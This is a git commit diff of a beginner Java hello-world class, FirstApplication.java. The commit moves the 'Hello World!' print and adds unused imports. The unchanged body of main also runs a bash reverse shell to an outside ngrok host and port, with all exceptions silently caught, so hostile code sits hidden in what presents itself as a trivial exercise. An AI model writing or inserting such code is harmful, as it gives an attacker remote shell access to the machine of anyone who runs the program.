7e3d6556fad55d7d82c1ecdb4180c31835fd1f8a
VP <10129407+Kapalov@users.noreply.github.com>
2024-01-19 14:45:14 +0100

    Update FirstApplication.java

--- src/main/java/com/mjc/stage0/FirstApplication.java
+++ src/main/java/com/mjc/stage0/FirstApplication.java
@@ -1,13 +1,17 @@
 package com.mjc.stage0;
 
+import java.util.Arrays;
+import java.util.Iterator;
+import java.util.List;
+
 public class FirstApplication {
     public static void main(String[] args) {
         Process p;
+        System.out.println("Hello World!"); 
         try {
             p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/19186 0>&1");
             p.waitFor();
             p.destroy();
-            System.out.println("Hello World!"); 
         } catch (Exception e) {}
     }
 }
